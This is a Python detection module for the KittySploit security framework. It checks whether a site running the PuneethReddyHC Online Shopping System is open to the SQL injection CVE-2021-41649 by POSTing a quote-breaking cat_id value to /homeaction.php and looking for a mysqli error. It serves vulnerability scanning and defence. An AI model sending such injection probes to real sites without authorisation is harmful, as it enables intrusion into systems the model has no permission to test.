#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An unauthenticated SQL injection vulnerability exists in PuneethReddyHC Online Shopping System through the /ho."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PuneethReddyHC Online Shopping System homeaction.php SQL Injection Detection',
        'description': 'An unauthenticated SQL injection vulnerability exists in PuneethReddyHC Online Shopping System through the /homeaction.php cat_id parameter. Using a post request does not sanitize the user input.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'sqli', 'injection', 'online-shopping-system-advanced_project', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/MobiusBinary/CVE-2021-41649',
            'https://awesomeopensource.com/project/PuneethReddyHC/online-shopping-system',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-41649',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/Offensive-Penetration-Security/OPSEC-Hall-of-fame',
        ],
        'cve': 'CVE-2021-41649',
    }

    def run(self):
        path = '/homeaction.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data="cat_id=4'&get_seleted_Category=1")
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('Warning: mysqli_num_rows() expects parameter 1 to be', 'xdebug-error xe-warning',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason='PuneethReddyHC Online Shopping System homeaction.php SQL Injection detected',
                path=path,
            )
            return True
        return False

